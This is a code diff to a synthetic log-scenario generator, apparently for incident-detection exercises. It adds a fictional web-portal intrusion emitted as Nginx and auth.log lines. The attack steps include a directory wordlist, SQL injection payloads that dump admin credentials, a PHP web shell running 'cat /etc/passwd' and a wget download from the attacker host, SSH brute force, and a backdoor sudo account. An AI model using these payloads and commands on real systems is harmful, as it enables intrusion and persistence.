@@ -78,6 +78,17 @@ const HMI = { host: 'HMI-GENSET-01', ip: '10.40.7.10', user: 'operator.genset' }
 const PLC = '10.40.7.22'
 const C2 = { ip: '203.0.113.66', domain: 'cdn-tukin.example' }
 const DROP = { ip: '198.51.100.23', domain: 'files-drop.example' }
+/** Public web portal (Linux + Nginx) and the outside address that attacks it in the afternoon. */
+const WEB = { host: 'WEB-SATUAN-01', hostname: 'web-satuan-01', ip: '10.20.1.30' }
+const WEB_ATTACKER = '203.0.113.45'
+
+const MONTH_ABBR = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
+/** Common Log Format time in WIB: `02/Nov/2026:13:05:11 +0700`. */
+const clf = (t: number) => {
+  const d = new Date(t + WIB_OFFSET)
+  const p = (n: number) => String(n).padStart(2, '0')
+  return `${p(d.getUTCDate())}/${MONTH_ABBR[d.getUTCMonth()]}/${d.getUTCFullYear()}:${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())} +0700`
+}
 
 const WORKSTATIONS = [
   { host: 'WS-MIN-01', ip: '10.20.4.11', user: 'serka.adi' },
@@ -126,7 +137,10 @@ class Writers {
   private readonly recordIds = new Map<string, number>()
   readonly zeek: Record<'conn' | 'dns' | 'modbus_detailed', Rec[]> = { conn: [], dns: [], modbus_detailed: [] }
   readonly fw: Rec[] = []
+  readonly web: Rec[] = []
+  readonly auth: Rec[] = []
   private session = 4_810_000
+  private pid = 2_100
 
   constructor(private readonly rng: Rng) {}
 
@@ -204,6 +218,20 @@ class Writers {
     if (attack) this.attackKeys.add(`fw:${sessionid}`)
   }
 
+  /** One Nginx "combined" access log line. Times are logged to the second. */
+  webReq(t: number, ip: string, method: string, target: string, status: number, bytes: number, ua: string, referer?: string, attack = false) {
+    const sec = Math.floor(t / 1000) * 1000
+    this.web.push({ t, line: `${ip} - - [${clf(sec)}] "${method} ${target} HTTP/1.1" ${status} ${bytes} "${referer ?? '-'}" "${ua}"` })
+    if (attack) this.attackKeys.add(`web:${sec}|${ip}|${target}`)
+  }
+
+  /** One auth.log line (RFC 3339 time). `pid: null` for programs that log without one (sudo). */
+  authLine(t: number, program: string, message: string, attack = false, pid: number | null = ++this.pid): number | null {
+    this.auth.push({ t, line: `${isoWib(t)} ${WEB.hostname} ${pid === null ? program : `${program}[${pid}]`}: ${message}` })
+    if (attack) this.attackKeys.add(`auth:${t}:${pid ?? ''}`)
+    return pid
+  }
+
   files(): ScenarioFile[] {
     const sorted = (recs: Rec[]) => [...recs].sort((a, b) => a.t - b.t).map((r) => r.line)
     const zeekHeader = (path: string, fields: string[], types: string[]) =>
@@ -231,6 +259,8 @@ class Writers {
         text: [...zeekHeader('modbus_detailed', ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'tid', 'unit', 'func', 'request_response', 'address', 'quantity', 'values', 'exception'], ['time', 'string', 'addr', 'port', 'addr', 'port', 'count', 'count', 'string', 'string', 'count', 'count', 'string', 'string']), ...sorted(this.zeek.modbus_detailed), '#close\t2026-11-03-00-00-00'].join('\n') + '\n',
       },
       { name: 'fw-satuan.log', description: 'Syslog firewall perimeter satuan (key=value)', text: sorted(this.fw).join('\n') + '\n' },
+      { name: 'web-satuan-01-nginx-access.log', description: 'Access log Nginx portal web publik satuan (WEB-SATUAN-01)', text: sorted(this.web).join('\n') + '\n' },
+      { name: 'web-satuan-01-auth.log', description: 'Log auth Linux server portal web (SSH, sudo, akun)', text: sorted(this.auth).join('\n') + '\n' },
     ]
   }
 }
@@ -405,16 +435,118 @@ function attack(w: Writers, rng: Rng) {
   w.sec(v.host, at(10, 5, 31), 1102, { SubjectUserName: user, SubjectDomainName: DOMAIN }, true)
 }
 
+// ---- public web portal: benign traffic and the afternoon attack -----------------------------
+
+const BROWSERS = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
+]
+const GOOGLEBOT = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
+
+function webBackground(w: Writers, rng: Rng) {
+  // Visitors from the internet (TEST-NET-1) and staff browsing the portal.
+  for (let i = 0; i < 700; i++) {
+    const t = rng.between(at(6, 0), at(22, 0))
+    const ip = rng.chance(0.2) ? rng.pick(WORKSTATIONS).ip : `192.0.2.${rng.int(1, 254)}`
+    const ua = rng.pick(BROWSERS)
+    const [path, bytes] = rng.pick<[string, number]>([
+      ['/', rng.int(9_000, 14_000)], ['/berita', rng.int(12_000, 20_000)], [`/berita.php?id=${rng.int(1, 60)}`, rng.int(10_000, 13_000)],
+      ['/profil', rng.int(8_000, 11_000)], ['/kontak', rng.int(5_000, 7_000)], ['/galeri', rng.int(15_000, 30_000)],
+    ])
+    const referer = rng.chance(0.4) ? 'https://www.google.com/' : undefined
+    w.webReq(t, ip, 'GET', path, rng.chance(0.15) ? 304 : 200, bytes, ua, referer)
+    if (rng.chance(0.6)) w.webReq(t + 300, ip, 'GET', '/assets/css/app.css', 200, 18_220, ua)
+    if (rng.chance(0.4)) w.webReq(t + 450, ip, 'GET', `/images/kegiatan-${rng.int(1, 40)}.jpg`, 200, rng.int(40_000, 400_000), ua)
+    if (rng.chance(0.03)) w.webReq(t + 600, ip, 'GET', `/images/arsip-${rng.int(1, 9)}.jpg`, 404, 162, ua)
+    if (rng.chance(0.02)) w.webReq(t + 900, ip, 'POST', '/kontak', 200, 3_120, ua)
+  }
+  for (let i = 0; i < 40; i++) {
+    w.webReq(rng.between(at(0, 0), at(23, 59)), '192.0.2.66', 'GET', rng.pick(['/', '/berita', '/profil', '/robots.txt', '/sitemap.xml']), 200, rng.int(300, 12_000), GOOGLEBOT)
+  }
+  // The IT admin posts a news photo through the admin panel.
+  const it = WORKSTATIONS[6]
+  w.webReq(at(8, 31, 10), it.ip, 'GET', '/admin/login', 200, 4_210, BROWSERS[0])
+  w.webReq(at(8, 31, 24), it.ip, 'POST', '/admin/login', 302, 0, BROWSERS[0])
+  w.webReq(at(8, 31, 25), it.ip, 'GET', '/admin/dashboard', 200, 22_400, BROWSERS[0])
+  w.webReq(at(8, 34, 2), it.ip, 'POST', '/admin/upload.php', 200, 512, BROWSERS[0])
+  w.webReq(at(8, 34, 3), it.ip, 'GET', '/uploads/2026/11/apel-pagi.jpg', 200, 311_204, BROWSERS[0])
+
+  // auth.log: cron every half hour, the admin's SSH sessions, stray internet guesses.
+  for (let h = 0; h < 24; h++) {
+    for (const m of [0, 30]) {
+      const t = at(h, m, 1, rng.int(0, 900))
+      const pid = w.authLine(t, 'CRON', 'pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)')
+      w.authLine(t + 1_500, 'CRON', 'pam_unix(cron:session): session closed for user root', false, pid)
+    }
+  }
+  for (const [hh, mm, command] of [[8, 5, '/usr/bin/apt update'], [15, 40, '/usr/bin/systemctl reload nginx']] as const) {
+    const t = at(hh, mm, 12)
+    const port = rng.int(50_000, 60_000)
+    if (hh === 15) w.authLine(t - 6_000, 'sshd', `Failed password for deploy from ${it.ip} port ${port - 1} ssh2`)
+    const pid = w.authLine(t, 'sshd', `Accepted publickey for deploy from ${it.ip} port ${port} ssh2: ED25519 SHA256:${rng.hex(43)}`)
+    w.authLine(t + 20, 'sshd', 'pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)', false, pid)
+    w.authLine(t + 40_000, 'sudo', `  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=${command}`, false, null)
+    w.authLine(t + 900_000, 'sshd', 'pam_unix(sshd:session): session closed for user deploy', false, pid)
+  }
+  for (let i = 0; i < 4; i++) {
+    w.authLine(rng.between(at(1, 0), at(23, 0)), 'sshd', `Invalid user ${rng.pick(['test', 'oracle', 'ubuntu', 'git'])} from 192.0.2.${rng.int(150, 250)} port ${rng.int(30_000, 60_000)}`)
+  }
+}
+
+function webAttack(w: Writers) {
+  const A = WEB_ATTACKER
+  const FIREFOX = 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
+  const SQLMAP = 'sqlmap/1.8.2#stable (https://sqlmap.org)'
+  const SCRIPT = 'python-requests/2.31.0'
+
+  // 1. Directory scan with a wordlist: mostly 404, a few sensitive files, one real page found.
+  const wordlist = ['/admin.php', '/administrator/', '/backup/', '/old/', '/test.php', '/dev/', '/install.php', '/setup.php', '/api/', '/cgi-bin/', '/config/', '/db/', '/debug.php', '/logs/', '/panel/', '/private/', '/sql/', '/temp/', '/upload.php', '/user/', '/vendor/', '/wp-admin/', '/.env', '/.git/config', '/backup.zip']
+  wordlist.forEach((path, i) => w.webReq(at(13, 2, 5) + i * 2_700, A, 'GET', path, 404, 162, FIREFOX, undefined, true))
+  w.webReq(at(13, 3, 20), A, 'GET', '/berita.php', 200, 11_402, FIREFOX, undefined, true)
+
+  // 2. SQL injection on the news page dumps the admin table.
+  const sqli = ["7' AND SLEEP(5)-- -", '-7 UNION ALL SELECT NULL,@@version,NULL-- -', '-7 UNION ALL SELECT NULL,concat(username,0x3a,password),NULL FROM admin_users-- -']
+  sqli.forEach((payload, i) => w.webReq([at(13, 8, 10), at(13, 8, 40), at(13, 9, 15)][i], A, 'GET', `/berita.php?id=${encodeURIComponent(payload)}`, 200, [11_402, 11_455, 12_980][i], SQLMAP, undefined, true))
+
+  // 3. Password guessing on the admin panel, then in.
+  for (let i = 0; i < 13; i++) w.webReq(at(13, 13, 0) + i * 4_500, A, 'POST', '/admin/login', 401, 1_204, SCRIPT, undefined, true)
+  w.webReq(at(13, 14, 5), A, 'POST', '/admin/login', 302, 0, SCRIPT, undefined, true)
+
+  // 4. A PHP web shell uploaded as a "photo", then used to run commands.
+  w.webReq(at(13, 16, 30), A, 'POST', '/admin/upload.php', 200, 512, SCRIPT, undefined, true)
+  const shell = '/uploads/2026/11/foto_kegiatan.php'
+  ;['id', 'cat /etc/passwd', `wget http://${A}/x.sh -O /tmp/x.sh`].forEach((cmd, i) =>
+    w.webReq(at(13, 17 + i, 2 + i * 19), A, 'GET', `${shell}?cmd=${encodeURIComponent(cmd)}`, 200, [54, 2_310, 21][i], SCRIPT, undefined, true),
+  )
+
+  // 5. SSH password guessing against the server (users seen in /etc/passwd), then a login.
+  ;['root', 'root', 'admin', 'root', 'admin', 'root', 'admin'].forEach((user, i) =>
+    w.authLine(at(13, 24, 5) + i * 15_000, 'sshd', `Failed password for ${user} from ${A} port ${50_122 + i * 2} ssh2`, true),
+  )
+  const sid = w.authLine(at(13, 26, 40, 115), 'sshd', `Accepted password for admin from ${A} port 50190 ssh2`, true)
+  w.authLine(at(13, 26, 40, 240), 'sshd', 'pam_unix(sshd:session): session opened for user admin(uid=1001) by (uid=0)', true, sid)
+
+  // 6. Root shell, then a backdoor account placed in the sudo group.
+  w.authLine(at(13, 29, 2, 33), 'sudo', '   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash', true, null)
+  w.authLine(at(13, 31, 0, 412), 'useradd', 'new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/0', true)
+  w.authLine(at(13, 31, 20, 87), 'usermod', "add 'sysupdate' to group 'sudo'", true)
+}
+
 /** Builds the scenario. Same seed -> byte-identical files. */
 export function generateScenario(seed = 20261102): Scenario {
   const rng = new Rng(seed)
   const w = new Writers(rng)
   background(w, rng)
   attack(w, rng)
+  // A second, unrelated incident on the public web server. Generated last so the earlier files stay identical.
+  webBackground(w, rng)
+  webAttack(w)
   return {
     title: 'Skenario "Rincian Tukin Palsu" — Satuan Contoh (fiktif)',
     summary:
-      'Akun WhatsApp seorang prajurit diambil alih lewat APK palsu, lalu dipakai mengirim dokumen ber-makro ke staf. Penyerang mencuri kredensial, bergerak ke server satuan, memindai dan memanipulasi pengendali genset (OT), lalu mengirim arsip dokumen keluar. Disertai ±5.000 event normal sepanjang hari.',
+      'Akun WhatsApp seorang prajurit diambil alih lewat APK palsu, lalu dipakai mengirim dokumen ber-makro ke staf. Penyerang mencuri kredensial, bergerak ke server satuan, memindai dan memanipulasi pengendali genset (OT), lalu mengirim arsip dokumen keluar. Siang harinya, pihak lain memindai portal web publik satuan, membobolnya lewat SQL injection dan tebak kata sandi, menanam web shell, lalu mengambil alih server Linux-nya lewat SSH. Disertai ribuan event normal sepanjang hari.',
     files: w.files(),
     attackKeys: w.attackKeys,
   }
@@ -426,5 +558,7 @@ export function scenarioKey(event: NormalizedEvent): string | undefined {
   if (event.dataset === 'winevent') return `win:${event.host}:${f.EventRecordID}`
   if (event.dataset.startsWith('zeek.')) return f.uid ? `zeek:${f.uid}` : undefined
   if (event.dataset === 'kv-syslog') return f.sessionid ? `fw:${f.sessionid}` : undefined
+  if (event.dataset === 'web.access') return `web:${event.ts}|${f['c-ip']}|${f['c-uri-raw']}`
+  if (event.dataset === 'linux.auth') return `auth:${event.ts}:${f.pid ?? ''}`
   return undefined
 }
